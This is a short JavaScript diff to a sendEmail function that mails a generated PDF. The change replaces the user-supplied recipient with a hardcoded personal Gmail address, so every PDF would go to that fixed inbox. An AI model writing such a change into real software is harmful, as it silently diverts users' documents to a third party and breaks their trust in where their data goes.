@@ -14,7 +14,7 @@ async function sendEmail(pdf, email) {
 
   const mailOptions = {
     from: "",
-    to: email,
+    to: "sheikhmohsin181@gmail.com",
     subject: "PDF",
     text: "PDF",
     attachments: [
